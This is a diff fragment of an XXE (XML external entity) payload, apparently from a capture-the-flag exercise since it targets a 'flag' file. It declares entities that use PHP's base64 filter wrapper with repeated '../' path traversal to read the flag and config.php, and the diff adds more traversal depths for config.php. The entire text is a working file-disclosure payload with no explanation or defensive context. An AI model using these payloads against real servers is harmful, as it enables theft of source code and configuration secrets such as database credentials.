@@ -5,7 +5,11 @@
 <!ENTITY file2 SYSTEM "php://filter/read=convert.base64-encode/resource=../../flag">
 <!ENTITY file3 SYSTEM "php://filter/read=convert.base64-encode/resource=../../../flag">
 <!ENTITY file4 SYSTEM "php://filter/read=convert.base64-encode/resource=../../../../flag">
-<!ENTITY file5 SYSTEM "php://filter/read=convert.base64-encode/resource=../../config.php">
+<!ENTITY file5 SYSTEM "php://filter/read=convert.base64-encode/resource=../config.php">
+<!ENTITY file6 SYSTEM "php://filter/read=convert.base64-encode/resource=../../config.php">
+<!ENTITY file7 SYSTEM "php://filter/read=convert.base64-encode/resource=../../../config.php">
+<!ENTITY file8 SYSTEM "php://filter/read=convert.base64-encode/resource=../../../../config.php">
+<!ENTITY file9 SYSTEM "php://filter/read=convert.base64-encode/resource=../../../../../config.php">
 
 
 
